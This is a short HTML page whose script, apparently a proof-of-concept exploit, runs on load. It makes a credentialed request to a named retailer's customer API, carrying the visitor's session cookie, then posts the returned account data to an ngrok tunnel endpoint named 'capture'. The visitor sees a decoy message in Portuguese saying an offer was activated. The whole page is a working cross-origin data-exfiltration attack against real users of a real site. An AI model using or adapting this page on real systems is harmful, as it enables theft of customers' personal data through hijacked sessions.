<!DOCTYPE html>
<html>
<body>
    <script>
        fetch("https://www.boozt.com/de/de/api/customer", {
            method: "GET", // Usando GET para simplicidade; pode mudar para PATCH se necessÃ¡rio
            credentials: "include", // Envia o PHPSESSID
            headers: {
                "X-Requested-With": "XMLHttpRequest"
            }
        })
        .then(response => response.json())
        .then(data => {
            // Envia os dados diretamente para o ngrok
            fetch("https://54b7-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", {
                method: "POST",
                body: JSON.stringify(data)
            })
            .then(() => {
                document.body.innerHTML = "Oferta ativada! Dados enviados com sucesso.";
            });
        })
        .catch(error => {
            document.body.innerHTML = "Erro: " + error.message;
        });
    </script>
</body>
</html>
